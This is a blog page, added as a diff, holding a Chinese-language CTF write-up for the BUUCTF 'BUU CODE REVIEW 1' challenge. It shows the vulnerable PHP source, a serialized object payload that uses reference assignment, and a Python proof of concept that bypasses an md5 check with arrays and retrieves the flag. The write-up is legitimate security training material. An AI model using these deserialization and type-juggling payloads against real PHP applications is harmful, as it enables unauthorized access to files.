@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>BUUCTF - BUU CODE REVIEW 1 Writeup | Kur0&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="BUU CODE REVIEW 1">
+    <meta name="generator" content="Hugo 0.144.2">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/buuctf-buu-code-review-1-writeup/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/buuctf-buu-code-review-1-writeup/">
+  <meta property="og:site_name" content="Kur0&#39;s Blog">
+  <meta property="og:title" content="BUUCTF - BUU CODE REVIEW 1 Writeup">
+  <meta property="og:description" content="BUU CODE REVIEW 1">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-01-30T12:52:58+00:00">
+    <meta property="article:modified_time" content="2022-01-30T12:52:58+00:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Buuctf">
+    <meta property="og:image" content="http://localhost:1313/posts/buuctf-buu-code-review-1-writeup/cover.png">
+
+  <meta itemprop="name" content="BUUCTF - BUU CODE REVIEW 1 Writeup">
+  <meta itemprop="description" content="BUU CODE REVIEW 1">
+  <meta itemprop="datePublished" content="2022-01-30T12:52:58+00:00">
+  <meta itemprop="dateModified" content="2022-01-30T12:52:58+00:00">
+  <meta itemprop="wordCount" content="137">
+  <meta itemprop="image" content="http://localhost:1313/posts/buuctf-buu-code-review-1-writeup/cover.png">
+  <meta itemprop="keywords" content="Writeup,Buuctf">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/buuctf-buu-code-review-1-writeup/cover.png">
+  <meta name="twitter:title" content="BUUCTF - BUU CODE REVIEW 1 Writeup">
+  <meta name="twitter:description" content="BUU CODE REVIEW 1">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+   
+  
+
+  
+  
+  
+  <header class="cover bg-center" style="background-image: url('/posts/buuctf-buu-code-review-1-writeup/cover.png');">
+    <div class="bg-black-60">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Kur0&#39;s Blog
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv6 ph3 ph4-ns">
+        
+          <div class="f2 f1-l fw2 white-90 mb0 lh-title">BUUCTF - BUU CODE REVIEW 1 Writeup</div>
+          
+            <div class="fw1 f5 f3-l white-80 measure-wide-l center lh-copy mt3 mb4">
+              BUU CODE REVIEW 1
+            </div>
+          
+        
+      </div>
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">BUUCTF - BUU CODE REVIEW 1 Writeup</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2022-01-30T12:52:58Z">January 30, 2022</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="打开链接显示代码">打开链接，显示代码</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Created by PhpStorm.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * User: jinzhao
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Date: 2019/10/6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Time: 8:04 PM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BUU</span> {
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> $correct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> $input <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">correct</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">uniqid</span>());
+</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">correct</span> <span style="color:#f92672">===</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span>) {
+</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>           }
+</span></span><span style="display:flex;"><span>       } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;pleaseget&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;1&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;pleasepost&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;2&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;md51&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;md52&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;md51&#39;</span>] <span style="color:#f92672">!=</span> $_POST[<span style="color:#e6db74">&#39;md52&#39;</span>]) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#e6db74">&#39;obj&#39;</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj</p>
+<blockquote>
+<p>考点1：php强弱类型比较
+考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。
+考点3：引用赋值</p></blockquote>
+<h1 id="php-payload">php payload:</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BUU</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $correct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $input <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BUU</span>();
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span> <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">correct</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($b);
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># O:3:&#34;BUU&#34;:2:{s:7:&#34;correct&#34;;s:0:&#34;&#34;;s:5:&#34;input&#34;;R:2;}
+</span></span></span></code></pre></div><h1 id="poc">poc:</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://1047cab0-ea8a-4945-8421-86af8b408454.node4.buuoj.cn:81/?pleaseget=1&#39;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;pleasepost&#39;</span>:<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;md51[]&#39;</span>:<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;md52[]&#39;</span>:<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;obj&#39;</span>:<span style="color:#e6db74">&#39;O:3:&#34;BUU&#34;:2:{s:7:&#34;correct&#34;;s:0:&#34;&#34;;s:5:&#34;input&#34;;R:2;}&#39;</span>} <span style="color:#75715e">#md5值比较绕过有两种方法：1.互联网搜索两个MD5值为0e开头的字符串;2.使用list绕过</span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;flag{&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;flag\{(.*)\}&#39;</span>,res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    print(flag)
+</span></span></code></pre></div><ul class="pa0">
+  
+   <li class="list di">
+     <a href="/tags/writeup/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Writeup</a>
+   </li>
+  
+   <li class="list di">
+     <a href="/tags/buuctf/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Buuctf</a>
+   </li>
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">Related</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
+          <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-specialapk/">蒙古马2020 Wirteups:reverse-specialapk</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-rev/">蒙古马2020 Wirteups:reverse-rev</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  Kur0's Blog 2025 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
